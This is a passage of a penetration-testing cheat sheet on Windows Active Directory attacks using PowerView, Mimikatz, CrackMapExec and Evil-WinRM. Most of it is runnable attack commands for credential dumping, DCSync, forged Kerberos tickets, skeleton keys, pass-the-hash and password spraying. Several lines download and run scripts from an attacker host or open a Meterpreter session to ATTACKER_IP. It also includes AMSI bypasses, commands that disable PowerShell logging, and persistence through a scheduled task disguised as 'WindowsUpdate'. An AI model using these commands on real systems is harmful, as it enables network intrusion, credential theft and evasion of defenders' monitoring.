net group "GROUP_NAME" TARGET_USER /add /domain

# PowerView
Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'TARGET_USER'
```

**GenericWrite on User:**

```powershell
# Set SPN for Kerberoasting
Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fake/svc'}

# Disable pre-authentication for AS-REP roasting
Set-DomainObject -Identity TARGET_USER -XOR @{useraccountcontrol=4194304}
```

**WriteDACL:**

```powershell
# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=DOMAIN,DC=LOCAL" -PrincipalIdentity TARGET_USER -Rights DCSync
```

**WriteOwner:**

```powershell
# Change object owner
Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity TARGET_USER

# Then modify permissions as owner
Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity TARGET_USER -Rights All
```

## Mimikatz

Mimikatz extracts credentials from memory, manipulates Kerberos tickets, and performs pass-the-hash/ticket attacks.

### Basic Mimikatz Usage

**Launch and Elevation:**

```bash
# Launch mimikatz
mimikatz.exe

# Enable debug privileges
privilege::debug

# Check privileges
privilege::debug
# Should return: Privilege '20' OK

# Elevate token if not admin
token::elevate
```

### Credential Extraction

**LSASS Dumping:**

```bash
# Standard credential dump
sekurlsa::logonpasswords

# Export to file
sekurlsa::logonpasswords > creds.txt

# Dump specific authentication package
sekurlsa::msv        # NTLM
sekurlsa::kerberos   # Kerberos
sekurlsa::wdigest    # WDigest (plaintext if enabled)
sekurlsa::tspkg      # TsPkg
sekurlsa::livessp    # LiveSSP

# Dump all
sekurlsa::logonpasswords full
```

**SAM Database Dumping:**

```bash
# Dump SAM (requires SYSTEM privileges)
lsadump::sam

# Dump from registry files
lsadump::sam /sam:SAM.save /system:SYSTEM.save

# Dump specific user
lsadump::sam /user:Administrator
```

**LSA Secrets:**

```bash
# Dump LSA secrets
lsadump::secrets

# From registry files
lsadump::secrets /system:SYSTEM.save /security:SECURITY.save
```

**Domain Controller Credential Extraction:**

```bash
# DCSync attack (requires replication rights)
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator

# DCSync all users
lsadump::dcsync /domain:DOMAIN.LOCAL /all

# DCSync with CSV output
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv

# Specific domain controller
lsadump::dcsync /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /user:krbtgt
```

**NTDS.dit Extraction:**

```bash
# On domain controller - create shadow copy
vssadmin create shadow /for=C:

# Note shadow copy path
# Copy NTDS.dit and SYSTEM hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.save

# Extract on attacker machine
secretsdump.py -ntds ntds.dit -system SYSTEM.save LOCAL
```

### Pass-the-Hash

```bash
# Pass-the-hash with mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:cmd.exe

# Pass-the-hash to specific computer
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:"cmd.exe /c dir \\TARGET\C$"

# Multiple commands
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:powershell.exe

# Then in new window
net use \\TARGET\C$ /user:DOMAIN\Administrator
```

### Kerberos Ticket Manipulation

**Ticket Export:**

```bash
# Export all tickets
sekurlsa::tickets /export

# Export specific ticket types
kerberos::list /export

# Lists current tickets
kerberos::list

# Purge tickets
kerberos::purge
```

**Ticket Injection:**

```bash
# Inject ticket from file
kerberos::ptt ticket.kirbi

# Pass-the-ticket
kerberos::ptt C:\Path\To\Ticket.kirbi

# Inject multiple tickets
kerberos::ptt /directory:C:\Tickets
```

**Golden Ticket Creation:**

```bash
# Create golden ticket (requires krbtgt hash)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt

# Golden ticket with specific groups
kerberos::golden /user:FakeAdmin /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /groups:512,513,518,519,520 /ptt

# Custom ticket lifetime
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /endin:525600 /renewmax:10080 /ptt

# Golden ticket for specific service
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /target:TARGET.DOMAIN.LOCAL /service:cifs /ptt

# Save to file instead of injecting
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi
```

**Silver Ticket Creation:**

```bash
# Create silver ticket (requires service account hash)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:TARGET.DOMAIN.LOCAL /service:cifs /rc4:SERVICE_NTHASH /ptt

# Silver ticket for specific services
# CIFS (file share)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:HASH /ptt

# HOST (scheduled tasks, services)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:host /rc4:HASH /ptt

# RPCSS (WMI)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:rpcss /rc4:HASH /ptt

# HTTP (PowerShell remoting)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:http /rc4:HASH /ptt

# LDAP (directory operations)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:DC.DOMAIN.LOCAL /service:ldap /rc4:HASH /ptt
```

**[Inference]** Silver tickets are more stealthy than golden tickets as they target specific services rather than domain-wide access. However, detection capabilities vary by organization's monitoring configuration.

### Advanced Mimikatz Techniques

**Skeleton Key Attack:**

```bash
# Install skeleton key (requires DA, allows password "mimikatz" for all users)
misc::skeleton

# After installation, authenticate with any username and password "mimikatz"
net use \\DC\C$ /user:DOMAIN\anyuser mimikatz
```

**[Unverified]** Skeleton key persistence across reboots depends on system configuration and may be detected by security monitoring.

**Trust Ticket (SID History):**

```bash
# Create trust ticket for child-parent domain escalation kerberos::golden /user:Administrator /domain:CHILD.DOMAIN.LOCAL /sid:CHILD_SID /sids:ENTERPRISE_ADMINS_SID /krbtgt:KRBTGT_HASH /ptt

# Multiple SID injection

kerberos::golden /user:Administrator /domain:CHILD.DOMAIN.LOCAL /sid:CHILD_SID /sids:SID1,SID2,SID3 /krbtgt:KRBTGT_HASH /ptt

# Cross-forest trust ticket

kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /rc4:TRUST_KEY /service:krbtgt /target:TRUSTED.DOMAIN.LOCAL /ptt
````

**Credential Guard Bypass:**

```bash
# Check if Credential Guard is enabled
sekurlsa::credman

# [Unverified] Credential Guard bypass techniques vary by Windows version and patch level
# Some methods require kernel-level access

# Export protected credentials (limited effectiveness with Credential Guard)
sekurlsa::dpapi
````

**DPAPI Credential Decryption:**

```bash
# Decrypt Chrome credentials
dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Decrypt saved credentials
sekurlsa::dpapi

# Dump DPAPI masterkeys
sekurlsa::dpapi

# Decrypt with masterkey
dpapi::cred /in:CREDENTIAL_FILE /masterkey:MASTERKEY_VALUE

# Dump DPAPI backup keys (DC only)
lsadump::backupkeys /system:DC.DOMAIN.LOCAL /export
```

**Certificate Export:**

```bash
# Export certificates with private keys
crypto::certificates /export

# Export to PFX format
crypto::certificates /systemstore:local_machine /store:my /export

# Export specific certificate
crypto::cng
```

**Token Manipulation:**

```bash
# List tokens
token::list

# Elevate to SYSTEM
token::elevate

# Elevate to specific account
token::elevate /domainadmin

# Revert token
token::revert

# Run command with token
token::run /process:cmd.exe
```

**Credential Vault:**

```bash
# Dump Windows Vault credentials
vault::cred

# Dump credential manager
vault::list
```

### Mimikatz Over Network (Remote Operations)

**Remote Credential Dumping:**

```bash
# Using PsExec to run mimikatz remotely
psexec.exe \\TARGET -u DOMAIN\Administrator -p Password123! -s cmd.exe
# Then run mimikatz commands

# Or copy and execute
copy mimikatz.exe \\TARGET\C$\Temp\
psexec.exe \\TARGET -u DOMAIN\Administrator -p Password123! C:\Temp\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit" > output.txt
```

**LSASS Memory Dump (Remote):**

```bash
# Create memory dump with Task Manager equivalent
comsvcs.dll,MiniDump PID C:\Temp\lsass.dmp full

# Or with ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# Analyze dump offline with mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Mimikatz Evasion Techniques

**Obfuscation:**

```bash
# Invoke-Mimikatz with AMSI bypass
powershell -ep bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Use SafetyKatz (obfuscated mimikatz)
SafetyKatz.exe "sekurlsa::logonpasswords"
```

**In-Memory Execution:**

```powershell
# Reflective loading
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Invoke-Mimikatz specific commands
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"'

# Output to variable
$creds = Invoke-Mimikatz -DumpCreds
```

## CrackMapExec

CrackMapExec (CME) is a post-exploitation framework for network enumeration, credential validation, and lateral movement across Windows networks.

### Installation and Setup

```bash
# Install via apt (Kali)
sudo apt install crackmapexec

# Or via pipx (recommended for latest version)
pipx install crackmapexec

# Update
pipx upgrade crackmapexec

# Initialize database
cme
```

### Basic Syntax and Authentication

```bash
# Basic syntax
cme <protocol> <target> -u <username> -p <password>

# Protocols: smb, winrm, ssh, mssql, ldap, ftp, rdp

# Single target
cme smb 192.168.1.10 -u Administrator -p Password123

# Multiple targets
cme smb 192.168.1.0/24 -u Administrator -p Password123
cme smb targets.txt -u Administrator -p Password123

# Username/password lists
cme smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Continue on success (don't stop after first valid cred)
cme smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# Hash authentication
cme smb 192.168.1.10 -u Administrator -H NTHASH
cme smb 192.168.1.10 -u Administrator -H LMHASH:NTHASH

# Null authentication
cme smb 192.168.1.10 -u '' -p ''

# Local authentication
cme smb 192.168.1.10 -u Administrator -p Password123 --local-auth
```

### SMB Protocol Operations

**SMB Enumeration:**

```bash
# Check SMB signing
cme smb 192.168.1.0/24

# Enumerate shares
cme smb 192.168.1.10 -u user -p pass --shares

# Enumerate shares with access permissions
cme smb 192.168.1.0/24 -u user -p pass --shares

# Enumerate sessions
cme smb 192.168.1.10 -u user -p pass --sessions

# Enumerate disks
cme smb 192.168.1.10 -u user -p pass --disks

# Enumerate logged on users
cme smb 192.168.1.10 -u user -p pass --loggedon-users

# Enumerate domain users
cme smb 192.168.1.10 -u user -p pass --users

# Enumerate domain groups
cme smb 192.168.1.10 -u user -p pass --groups

# Enumerate local users
cme smb 192.168.1.10 -u user -p pass --local-users

# Enumerate local groups
cme smb 192.168.1.10 -u user -p pass --local-groups

# RID brute force
cme smb 192.168.1.10 -u user -p pass --rid-brute

# Pass-the-Hash spray
cme smb 192.168.1.0/24 -u Administrator -H NTHASH --local-auth
```

**Credential Validation:**

```bash
# Password spray (careful with lockout policies)
cme smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Validate single credential across network
cme smb 192.168.1.0/24 -u Administrator -p Password123

# Check local admin access (Pwn3d! indicator)
cme smb 192.168.1.0/24 -u Administrator -p Password123

# Output shows:
# [+] = Valid credentials
# (Pwn3d!) = Local admin rights
```

**Command Execution:**

```bash
# Execute command via WMI
cme smb 192.168.1.10 -u Administrator -p Password123 -x "whoami"

# Execute PowerShell command
cme smb 192.168.1.10 -u Administrator -p Password123 -X "Get-Process"

# Execute command across multiple targets
cme smb 192.168.1.0/24 -u Administrator -p Password123 -x "ipconfig"

# No output (fire and forget)
cme smb 192.168.1.10 -u Administrator -p Password123 -x "whoami" --no-output
```

**File Operations:**

```bash
# Spider shares for interesting files
cme smb 192.168.1.10 -u user -p pass -M spider_plus

# Get file
cme smb 192.168.1.10 -u user -p pass --get-file "C:\Windows\System32\drivers\etc\hosts" hosts.txt

# Put file
cme smb 192.168.1.10 -u user -p pass --put-file payload.exe "C:\Windows\Temp\payload.exe"

# Download file from share
cme smb 192.168.1.10 -u user -p pass --share C$ --get-file Windows/System32/config/SAM SAM.save
```

**Credential Dumping:**

```bash
# Dump SAM hashes
cme smb 192.168.1.10 -u Administrator -p Password123 --sam

# Dump LSA secrets
cme smb 192.168.1.10 -u Administrator -p Password123 --lsa

# Dump NTDS.dit (Domain Controller)
cme smb DC_IP -u Administrator -p Password123 --ntds

# Dump NTDS with specific options
cme smb DC_IP -u Administrator -p Password123 --ntds --users
cme smb DC_IP -u Administrator -p Password123 --ntds --users --enabled

# Use VSS method
cme smb DC_IP -u Administrator -p Password123 --ntds vss
```

### Built-in Modules

**List Available Modules:**

```bash
# List all modules for protocol
cme smb --list-modules
cme winrm --list-modules

# Module info
cme smb -M MODULE_NAME --module-info
```

**Common SMB Modules:**

```bash
# Mimikatz execution
cme smb 192.168.1.10 -u Administrator -p Password123 -M mimikatz

# Mimikatz with specific command
cme smb 192.168.1.10 -u Administrator -p Password123 -M mimikatz -o COMMAND="sekurlsa::logonpasswords"

# Enumerate antivirus
cme smb 192.168.1.0/24 -u user -p pass -M enum_avproducts

# Enumerate Chrome credentials
cme smb 192.168.1.10 -u Administrator -p Password123 -M enum_chrome

# Check for MS17-010 (EternalBlue)
cme smb 192.168.1.0/24 -M ms17-010

# Check for MS08-067
cme smb 192.168.1.0/24 -M ms08-067

# Enumerate network interfaces
cme smb 192.168.1.10 -u user -p pass -M enum_network

# PetitPotam check
cme smb 192.168.1.0/24 -M petitpotam

# Check WebClient service (for relay attacks)
cme smb 192.168.1.0/24 -M webdav

# Dump LAPS passwords
cme ldap DC_IP -u user -p pass -M laps

# GPP password extraction
cme smb 192.168.1.10 -u user -p pass -M gpp_password

# WDigest enable (downgrade for plaintext creds)
cme smb 192.168.1.10 -u Administrator -p Password123 -M wdigest -o ACTION=enable

# Spider Plus (enhanced file searching)
cme smb 192.168.1.10 -u user -p pass -M spider_plus
cme smb 192.168.1.10 -u user -p pass -M spider_plus -o READ_ONLY=false

# Procdump LSASS
cme smb 192.168.1.10 -u Administrator -p Password123 -M procdump

# UAC status check
cme smb 192.168.1.0/24 -u user -p pass -M uac

# Enumeration modules
cme smb 192.168.1.10 -u user -p pass -M enum_dns
cme smb 192.168.1.10 -u user -p pass -M met_inject -o LHOST=ATTACKER_IP LPORT=4444
```

### LDAP Protocol Operations

```bash
# Basic LDAP authentication
cme ldap DC_IP -u user -p pass

# Enumerate domain users
cme ldap DC_IP -u user -p pass --users

# Enumerate domain groups
cme ldap DC_IP -u user -p pass --groups

# Enumerate computers
cme ldap DC_IP -u user -p pass --computers

# Check for AS-REP Roasting
cme ldap DC_IP -u user -p pass --asreproast output.txt

# Check for Kerberoasting
cme ldap DC_IP -u user -p pass --kerberoasting output.txt

# Enumerate trusted domains
cme ldap DC_IP -u user -p pass --trusted-for-delegation

# Get domain password policy
cme ldap DC_IP -u user -p pass --pass-pol

# Admin count users
cme ldap DC_IP -u user -p pass --admin-count

# Enumerate GMSAs
cme ldap DC_IP -u user -p pass --gmsa

# Get LAPS passwords
cme ldap DC_IP -u user -p pass -M laps

# Bloodhound data collection
cme ldap DC_IP -u user -p pass --bloodhound -ns DC_IP --collection All
```

### WinRM Protocol Operations

```bash
# Basic WinRM authentication
cme winrm 192.168.1.10 -u Administrator -p Password123

# Execute command
cme winrm 192.168.1.10 -u Administrator -p Password123 -x "whoami"

# PowerShell command
cme winrm 192.168.1.10 -u Administrator -p Password123 -X "Get-Process"

# With hash
cme winrm 192.168.1.10 -u Administrator -H NTHASH

# Check multiple hosts for WinRM access
cme winrm 192.168.1.0/24 -u Administrator -p Password123
```

### MSSQL Protocol Operations

```bash
# Basic MSSQL authentication
cme mssql 192.168.1.10 -u sa -p Password123

# Execute query
cme mssql 192.168.1.10 -u sa -p Password123 -q "SELECT @@version"

# Execute command via xp_cmdshell
cme mssql 192.168.1.10 -u sa -p Password123 -x "whoami"

# Check if xp_cmdshell is enabled
cme mssql 192.168.1.10 -u sa -p Password123 -M mssql_priv

# Enumerate MSSQL instances
cme mssql 192.168.1.0/24 -u sa -p Password123

# Windows authentication
cme mssql 192.168.1.10 -u DOMAIN\\user -p password -d DOMAIN
```

### SSH Protocol Operations

```bash
# SSH authentication
cme ssh 192.168.1.10 -u root -p password

# With key
cme ssh 192.168.1.10 -u root --key-file id_rsa

# Execute command
cme ssh 192.168.1.10 -u root -p password -x "id"

# Sudo command execution
cme ssh 192.168.1.10 -u user -p password --sudo-check
cme ssh 192.168.1.10 -u user -p password -x "whoami" --sudo
```

### Database Management

```bash
# View database
cme smb --show-credentials
cme smb --show-hosts

# Export database
cme smb --export-db creds.db

# Clear database
cme smb --clear-database

# View specific credential types
cme smb --show-credentials --filter-credentials ntlm
```

### Advanced CrackMapExec Techniques

**Relay Attack Preparation:**

```bash
# Identify hosts without SMB signing
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Check for WebClient service (coercion targets)
cme smb 192.168.1.0/24 -u user -p pass -M webdav

# Use with ntlmrelayx
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

**Password Policy Enumeration:**

```bash
# SMB method
cme smb DC_IP -u user -p pass --pass-pol

# LDAP method (more detailed)
cme ldap DC_IP -u user -p pass --pass-pol
```

**Kerberos Operations:**

```bash
# Use Kerberos authentication
cme smb TARGET.DOMAIN.LOCAL -u user -p pass -k

# Export tickets
export KRB5CCNAME=/path/to/ticket.ccache
cme smb TARGET.DOMAIN.LOCAL -u user --use-kcache
```

**Logging and Output:**

```bash
# Verbose output
cme smb 192.168.1.0/24 -u user -p pass --verbose

# Debug output
cme smb 192.168.1.0/24 -u user -p pass --debug

# Specify log file
cme smb 192.168.1.0/24 -u user -p pass --log cme_output.log

# Disable logging
cme smb 192.168.1.0/24 -u user -p pass --no-log
```

**Concurrent Connections:**

```bash
# Default threads: 100
# Adjust thread count
cme smb 192.168.1.0/24 -u user -p pass -t 50

# Single threaded (stealthier)
cme smb 192.168.1.0/24 -u user -p pass -t 1
```

**Chaining with Other Tools:**

```bash
# Extract credentials and use with impacket
cme smb 192.168.1.10 -u Administrator -p Password123 --sam --lsa
# Copy NTLM hash from output
impacket-wmiexec -hashes :NTHASH DOMAIN/Administrator@TARGET_IP

# Bloodhound integration
cme ldap DC_IP -u user -p pass --bloodhound -ns DC_IP -c All
# Import JSON files into Bloodhound

# Combine with Responder for credential capture
responder -I eth0 -dwv
# In another terminal
cme smb 192.168.1.0/24 --gen-relay-list targets.txt
```

### CrackMapExec Operational Patterns

**Initial Access Pattern:**

```bash
# 1. Network discovery
cme smb 192.168.1.0/24

# 2. Credential validation
cme smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# 3. Identify local admin access
cme smb 192.168.1.0/24 -u Administrator -H NTHASH

# 4. Dump credentials
cme smb COMPROMISED_HOST -u Administrator -H NTHASH --sam --lsa

# 5. Lateral movement
cme smb NEW_TARGET -u Administrator -H NEW_NTHASH -x "whoami"
```

**Domain Enumeration Pattern:**

```bash
# 1. Password policy
cme ldap DC_IP -u user -p pass --pass-pol

# 2. User enumeration
cme ldap DC_IP -u user -p pass --users

# 3. Group enumeration
cme ldap DC_IP -u user -p pass --groups

# 4. AS-REP Roasting
cme ldap DC_IP -u user -p pass --asreproast asrep_hashes.txt

# 5. Kerberoasting
cme ldap DC_IP -u user -p pass --kerberoasting kerberoast_hashes.txt

# 6. Bloodhound collection
cme ldap DC_IP -u user -p pass --bloodhound -ns DC_IP -c All
```

**Persistence Establishment:**

```bash
# 1. Identify all systems with local admin
cme smb 192.168.1.0/24 -u Administrator -H NTHASH | grep "Pwn3d"

# 2. Enable WDigest for future plaintext capture
cme smb TARGET_LIST -u Administrator -H NTHASH -M wdigest -o ACTION=enable

# 3. Create scheduled tasks (persistence)
cme smb TARGET -u Administrator -H NTHASH -x 'schtasks /create /tn "WindowsUpdate" /tr "powershell -enc PAYLOAD" /sc onlogon /ru System'
```

---

**Important Related Topics:**

- **Covenant C2 Framework**: Alternative to Mimikatz for in-memory credential theft with C2 capabilities
- **Rubeus**: Kerberos-focused exploitation tool complementing Mimikatz functionality
- **PowerView**: PowerShell Active Directory enumeration complementing BloodHound
- **Empire/Starkiller**: Post-exploitation framework integrating many of these tools
- **NetExec (NetCat Evolution)**: CrackMapExec successor with enhanced features
- **Kerbrute**: Fast Kerberos-based user enumeration and password spraying
- **ADModule**: Pure PowerShell AD enumeration without BloodHound dependencies

---

## Evil-WinRM

### Overview

Evil-WinRM provides PowerShell remoting capabilities for penetration testing Windows systems. Implements WinRM protocol with built-in file transfer, PowerShell script execution, and modules loading for post-exploitation.

### Installation and Verification

**Check installation:**

```bash
evil-winrm --version
which evil-winrm

# Kali typically includes it by default
```

**Manual installation (if needed):**

```bash
# Ruby gem installation
sudo gem install evil-winrm

# From GitHub
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
sudo gem install bundler
bundle install
```

**Verify dependencies:**

```bash
# Required Ruby gems
gem list | grep -E 'winrm|stringio|logger|fileutils'
```

### Basic Connection

**Standard authentication:**

```bash
# Username and password
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'

# Domain user
evil-winrm -i 192.168.1.10 -u 'DOMAIN\username' -p 'Password123'

# Specify port (default 5985 HTTP, 5986 HTTPS)
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -P 5985
```

**SSL/TLS connection:**

```bash
# HTTPS (port 5986)
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -S

# Custom SSL port
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -S -P 5986

# Ignore SSL certificate validation
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -S -N
```

**Hash-based authentication (Pass-the-Hash):**

```bash
# NTLM hash authentication
evil-winrm -i 192.168.1.10 -u administrator -H 'NTLM_HASH_HERE'

# Example with actual hash format
evil-winrm -i 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71'

# Domain user with hash
evil-winrm -i 192.168.1.10 -u 'DOMAIN\administrator' -H 'NTLM_HASH'
```

**Public key authentication:**

```bash
# Certificate-based authentication
evil-winrm -i 192.168.1.10 -u username -c certificate.pem -k private_key.pem

# SSL with client certificate
evil-winrm -i 192.168.1.10 -u username -c cert.pem -k key.pem -S
```

### Connection Options

**Realm specification:**

```bash
# Kerberos realm
evil-winrm -i 192.168.1.10 -u username -p password -r DOMAIN.LOCAL
```

**Timeout and retries:**

```bash
# Custom timeout (seconds)
evil-winrm -i 192.168.1.10 -u administrator -p password -t 30

# Connection through proxy
evil-winrm -i 192.168.1.10 -u administrator -p password --proxy http://127.0.0.1:8080
```

**Script and executable paths:**

```bash
# Specify scripts directory
evil-winrm -i 192.168.1.10 -u administrator -p password -s /opt/powershell-scripts/

# Specify executables directory
evil-winrm -i 192.168.1.10 -u administrator -p password -e /opt/windows-binaries/

# Both scripts and executables
evil-winrm -i 192.168.1.10 -u administrator -p password -s /opt/scripts/ -e /opt/binaries/
```

### Built-in Commands

**File operations:**

```bash
# Upload file to target
*Evil-WinRM* PS C:\Users\Administrator> upload /root/payload.exe C:\Windows\Temp\payload.exe

# Download file from target
*Evil-WinRM* PS C:\Users\Administrator> download C:\Users\Administrator\Desktop\sensitive.txt /root/loot/

# Upload with progress indicator
*Evil-WinRM* PS C:\Users\Administrator> upload /root/large_file.zip

# Download entire directory (not directly supported, use PowerShell zip first)
*Evil-WinRM* PS C:\Users\Administrator> Compress-Archive -Path C:\Sensitive\ -DestinationPath C:\Temp\data.zip
*Evil-WinRM* PS C:\Users\Administrator> download C:\Temp\data.zip
```

**Service management:**

```bash
# List services
*Evil-WinRM* PS C:\> services

# Specific service information
*Evil-WinRM* PS C:\> Get-Service -Name "MSSQLSERVER"

# Start/stop service
*Evil-WinRM* PS C:\> Start-Service -Name "ServiceName"
*Evil-WinRM* PS C:\> Stop-Service -Name "ServiceName"
```

**Menu system:**

```bash
# Show available Evil-WinRM commands
*Evil-WinRM* PS C:\> menu

# Output:
# - Bypass-4MSI
# - services
# - upload
# - download
# - Invoke-Binary
```

### PowerShell Script Execution

**Load and execute scripts:**

```bash
# From specified scripts directory (-s flag)
*Evil-WinRM* PS C:\> Invoke-PowerView.ps1

# Execute specific function from loaded script
*Evil-WinRM* PS C:\> Get-NetUser

# Load multiple scripts
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
*Evil-WinRM* PS C:\> Invoke-Kerberoast.ps1
```

**Script directory structure:**

```bash
# Organize scripts before connecting
mkdir -p /opt/powershell-scripts
cd /opt/powershell-scripts

# Download common scripts
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1

# Connect with scripts directory
evil-winrm -i 192.168.1.10 -u administrator -p password -s /opt/powershell-scripts/
```

**In-memory script execution:**

```bash
# Execute without writing to disk
*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/PowerView.ps1')

# One-liner exploitation
*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```

### Binary Execution

**Invoke-Binary command:**

```bash
# Execute binary from specified directory (-e flag)
*Evil-WinRM* PS C:\> Invoke-Binary /opt/windows-binaries/mimikatz.exe

# With arguments
*Evil-WinRM* PS C:\> Invoke-Binary /opt/windows-binaries/mimikatz.exe "sekurlsa::logonpasswords"

# Example executables directory setup
mkdir -p /opt/windows-binaries
cd /opt/windows-binaries

# Common binaries
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip
unzip SharpHound-v1.1.1.zip

# Connect with executables directory
evil-winrm -i 192.168.1.10 -u administrator -p password -e /opt/windows-binaries/
```

**In-memory binary execution:**

```bash
# Load binary into memory
*Evil-WinRM* PS C:\> $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5/Rubeus.exe')
*Evil-WinRM* PS C:\> $assembly = [System.Reflection.Assembly]::Load($data)
*Evil-WinRM* PS C:\> [Rubeus.Program]::Main("kerberoast".Split())
```

### AMSI and Logging Bypass

**Bypass-4MSI (AMSI bypass):**

```bash
# Evil-WinRM includes AMSI bypass
*Evil-WinRM* PS C:\> Bypass-4MSI

# Verify AMSI status
*Evil-WinRM* PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Manual AMSI bypass alternatives
*Evil-WinRM* PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

**Logging bypass techniques:**

```bash
# Disable PowerShell logging
*Evil-WinRM* PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Disable transcript logging
*Evil-WinRM* PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0

# Check current logging status
*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\*" -ErrorAction SilentlyContinue
```

### Domain Enumeration

**Active Directory reconnaissance:**

```bash
# Load PowerView
*Evil-WinRM* PS C:\> Invoke-PowerView.ps1

# Domain information
*Evil-WinRM* PS C:\> Get-Domain
*Evil-WinRM* PS C:\> Get-DomainController
*Evil-WinRM* PS C:\> Get-Forest

# User enumeration
*Evil-WinRM* PS C:\> Get-NetUser
*Evil-WinRM* PS C:\> Get-NetUser -SPN  # Kerberoastable accounts

# Group enumeration
*Evil-WinRM* PS C:\> Get-NetGroup
*Evil-WinRM* PS C:\> Get-NetGroupMember "Domain Admins"

# Computer enumeration
*Evil-WinRM* PS C:\> Get-NetComputer
*Evil-WinRM* PS C:\> Get-NetComputer -OperatingSystem "*Server*"

# Share enumeration
*Evil-WinRM* PS C:\> Invoke-ShareFinder
